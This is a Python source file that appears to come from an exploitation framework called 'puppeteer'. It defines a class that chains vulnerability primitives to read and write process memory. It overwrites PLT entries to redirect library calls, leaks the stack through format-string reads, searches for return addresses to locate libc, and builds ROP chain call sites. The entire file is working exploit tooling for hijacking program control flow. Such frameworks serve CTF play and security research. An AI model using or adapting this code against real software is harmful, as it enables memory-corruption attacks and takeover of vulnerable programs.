import logging
l = logging.getLogger("puppeteer.manipulator")

import abc
import struct
import itertools

from .errors import * #pylint: disable=wildcard-import
from .formatter import format_string, offset_read
from .architectures import x86

# pylint: disable=no-self-use,unused-argument
class Manipulator:
    __metaclass__ = abc.ABCMeta

    def __init__(self, arch=x86):
        '''
        This should connect to or spawn up the program in question.
        '''
        self.arch = arch
        self.plt = { }
        self.rop_cleanups = { }
        self.locations = { }
        self.info = { }

    #
    # Utility funcs
    #

    def pack(self, n):
        if type(n) in (int, long):
            return struct.pack(self.arch.struct_fmt, n)
        if type(n) == str:
            return n

    def unpack(self, n):
        if type(n) in (int, long):
            return n
        if type(n) == str:
            return struct.unpack(self.arch.struct_fmt, n)[0]

    def _get_vulns(self, t, safe):
        vulns = [ ]
        unsafe_vulns = [ ]

        l.debug("Looking for a %s vuln with safe=%s", t, safe)

        for a in dir(self):
            #l.debug("... checking attribute %s", a)
            f = getattr(self, a)
            if hasattr(f, 'puppeteer_flags') and f.puppeteer_flags['type'] == t:
                if f.puppeteer_flags['safe']:
                    vulns.append(f)
                else:
                    unsafe_vulns.append(f)

        if safe is None:
            return vulns + unsafe_vulns
        elif safe:
            return vulns
        elif not safe:
            return unsafe_vulns

    def _do_vuln(self, vuln_type, args, kwargs, safe=None):
        funcs = self._get_vulns(vuln_type, safe)

        for f in funcs:
            try:
                l.debug("Trying function %s", f.func_name)
                return f(*args, **kwargs)
            except CantDoItCaptainError:
                l.debug("... failed!")

        l.debug("Couldn't find an appropriate vuln :-(")
        raise CantDoItCaptainError("No %s%s functions available!" % (('safe ' if safe is True else ('unsafe ' if self is False else '')), vuln_type))

    #
    # Actions!
    #

    def do_memory_read(self, addr, length, safe=None):
        ''' Finds and executes an vuln that does a memory read. '''
        return self._do_vuln('memory_read', (addr, length), { }, safe=True)

    def do_register_read(self, reg, safe=None):
        ''' Finds and executes an vuln that does a register read. '''
        return self._do_vuln('register_read', (reg,), { }, safe=True)

    def do_memory_write(self, addr, content, safe=None):
        ''' Finds and executes an vuln that does a memory write. '''

        # if safe is None, try safe first, then unsafe
        if safe is None:
            try: return self.do_memory_write(addr, content, safe=True)
            except CantDoItCaptainError: return self.do_memory_write(addr, content, safe=False)

        l.debug("First trying a direct memory write.")
        try:
            return self._do_vuln('memory_write', (addr, content), { }, safe=True)
        except CantDoItCaptainError:
            l.debug("... just can't do it, captain!")

        l.debug("Now trying a naive printf write.")
        return self.do_printf((addr, content), safe=None)

    def do_register_write(self, reg, content, safe=None):
        ''' Finds and executes an vuln that does a register write. '''
        return self._do_vuln('register_write', (reg, content), { }, safe=True)

    def do_printf(self, stuff, safe=None):
        ''' Finds and executes an vuln that does a memory read. '''

        if type(stuff) is str:
            # if it's a string, just do the format string
            return self._do_vuln('printf', (stuff,), { }, safe=None)
        else:
            # this is an overwrite of a set of bytes. We don't care about the output.
            funcs = self._get_vulns('printf', safe)
            chunks = [ (stuff[0]+i, j) for i,j in enumerate(stuff[1]) ]

            for c in chunks:
                for f in funcs:
                    fmt = format_string((c,), f.puppeteer_flags['bytes_to_fmt'], pad_to=f.puppeteer_flags['max_fmt_size'], word_size=self.arch.bytes, endness=self.arch.endness)
                    try:
                        l.debug("Trying format string through %s.", f.func_name)
                        f(fmt)
                    except CantDoItCaptainError:
                        l.debug("... failed")

            return ""


    #
    # More complex stuff
    #

    def redirect_library_function(self, name, target, safe=None):
        '''
        Redirects a PLT entry to jump to target.

        @params name: the name to redirect
        @params target: the address to redirect to
        '''
        self.do_memory_write(self.plt[name], self.pack(target), safe=safe)

    def read_stack(self, length, safe=None):
        '''
        Read the stack, from the current stack pointer (or something close), to sp+length

        @params length: the number of bytes to read. More bytes might be attempted if we end up using
                        a printf
        @params safe: if True, only do a safe read, if False, only do an unsafe read, if None do either
        '''

        # if safe is None, try safe first, then unsafe
        if safe is None:
            try: return self.read_stack(length, safe=True)
            except CantDoItCaptainError: return self.read_stack(length, safe=False)

        # First, try direct memory reads. Then try a printf.
        try:
            l.debug("Trying to read %s and read bytes directly.", self.arch.sp_name)

            sp = self.do_register_read(self.arch.sp_name)
            return self.do_memory_read(sp, length)
        except CantDoItCaptainError:
            l.debug("... I just can't do it, captain!", exc_info=True)

        l.debug("Now trying to use a format string.")
        # read bytes a wordsize at a time
        result = ""
        max_i = (length + self.arch.bytes - 1) / self.arch.bytes
        for i in range(1, max_i):
            result += self.do_printf(offset_read(i, self.arch.bytes*2, max_offset=max_i, round_to=self.arch.bytes, pad_with='_')).replace('_', '')
        return result.decode('hex')

    def main_return_address(self, start_offset=1):
        # strategy:
        # 1. search for a return address to main
        # 2. look for main's return address (to __libc_start_main)
        # 3. awesome!

        l.debug("Looking for libc!")

        for i in itertools.count(start=start_offset):
            l.debug("... checking offset %d", i)
            fmt = offset_read(i, self.arch.bytes*2, max_offset=10000, round_to=self.arch.bytes, pad_with='_')
            v = struct.unpack(">" + self.arch.struct_char, self.do_printf(fmt).replace('_', '').decode('hex'))[0]
            if v >= self.locations['main'] and v <= self.locations['#main_end']:
                l.debug("... found the return address to main (specifically, to 0x%x) at offset %d!", v, i)
                break

        i += 3 + self.info['main_stackframe_size'] / self.arch.bytes # pylint: disable=undefined-loop-variable
        l.debug("... the return address into __libc_start_main should be at offset %d", i)

        fmt = offset_read(i, self.arch.bytes*2, max_offset=10000, round_to=self.arch.bytes, pad_with='_')
        v = struct.unpack(">" + self.arch.struct_char, self.do_printf(fmt).replace('_', '').decode('hex'))[0]
        return v


    #
    # ROP stuff
    #

    def rop_site_array(self, call_target, ret_target, args, cleanup=True):
        '''
        Returns a callsite for a piece of a ROP chain. Args and the ret_target
        can be None, in which case they'll either not be written (when doing an
        array write) or will be replaced with 0x41414141* (when doing a string
        write).
        '''
        s = [ ]

        # this is what we're calling
        s.append(self.pack(call_target))

        # this is where we'll return to immediately
        if cleanup:
            s.append(self.pack(self.rop_cleanups[len(args)]))
        else:
            s.append(self.pack(ret_target))

        # our arguments
        for a in args:
            if a is not None:
                s.append(self.pack(a))
            else:
                s.append(None)

        # if we're cleaning up, *now* we return to the ret target
        if cleanup and ret_target is not None:
            s.append(self.pack(ret_target))

        return s

    def rop_site_bytes(self, *args, **kwargs):
        '''
        Returns a string of a callsite for a piece of a ROP chain.
        '''
        s = ""
        for w in self.rop_site_array(*args, **kwargs):
            if w is not None:
                s += w
            else:
                s += 'A' * self.arch.bytes
        return s
